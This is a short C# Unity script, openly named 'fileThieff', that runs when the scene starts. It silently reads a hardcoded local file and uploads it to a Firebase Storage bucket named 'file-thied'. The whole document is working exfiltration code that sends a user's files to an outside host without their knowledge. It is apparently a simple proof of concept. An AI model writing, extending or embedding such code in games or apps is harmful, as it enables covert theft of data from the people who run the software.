using System.IO;
using UnityEngine;
using Firebase;
using Firebase.Extensions;
using Firebase.Storage;

public class fileThieff : MonoBehaviour
{
    private FirebaseStorage storage;

    void Start()
    {
        FirebaseApp.CheckAndFixDependenciesAsync().ContinueWithOnMainThread(task =>
        {
            FirebaseApp.Create();
            storage = FirebaseStorage.DefaultInstance;
            UploadFile("C:\\aFile\\aText.txt");
        });
    }

    private void UploadFile(string localFilePath)
    {
        if (!File.Exists(localFilePath))
        {
            Debug.LogError("File not found: " + localFilePath);
            return;
        }

        string storagePath = "uploads/" + Path.GetFileName(localFilePath);
        StorageReference storageRef = storage.GetReferenceFromUrl("gs://file-thied.appspot.com/").Child(storagePath);

        byte[] fileData = File.ReadAllBytes(localFilePath);
        storageRef.PutBytesAsync(fileData).ContinueWithOnMainThread(task =>
        {
            if (task.IsFaulted)
            {
                Debug.LogError("Upload failed: " + task.Exception);
            }
            else
            {
                Debug.Log("Upload successful");
            }
        });
    }
}
